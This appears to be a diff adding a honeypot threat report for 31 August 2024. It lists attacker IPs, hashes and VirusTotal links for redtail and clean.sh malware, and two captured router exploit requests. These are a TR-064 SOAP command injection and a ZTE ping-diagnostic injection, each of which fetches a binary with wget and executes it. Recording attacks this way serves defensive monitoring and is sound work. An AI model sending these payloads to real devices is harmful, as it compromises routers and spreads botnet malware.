@@ -1,0 +1,58 @@
+Top 5 IPs for 31-08-2024 :
+
+103.82.240.194
+40.64.56.125
+197.153.57.103
+185.233.36.187
+185.46.18.99
+
+
+Malware Observed:
+
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File Name : redtail.arm7
+9f9097b852495fafc6a58a457a51fc396f324bfb1907ab72516e9c727551bcd8
+https://www.virustotal.com/gui/file/9f9097b852495fafc6a58a457a51fc396f324bfb1907ab72516e9c727551bcd8
+
+File Name : redtail.arm8
+88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+https://www.virustotal.com/gui/file/88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+
+File Name : redtail.i686
+42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+https://www.virustotal.com/gui/file/42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+
+File Name : redtail.x86_64
+eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d
+https://www.virustotal.com/gui/file/eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d
+
+Commands/exploits observed
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://192.168.1.1:8088/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+
+POST /login.gch HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Content-Length: 420
+Connection: keep-alive
+Accept: */*
+
+Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7.POST /manager_dev_ping_t.gch HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Content-Length: 420
+Connection: keep-alive
+Accept: */*
+
+&Host=;$(cd /tmp;wget http://45.148.120.244/mips; chmod 777 mips; ./mips zte;rm -rf mips;)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit
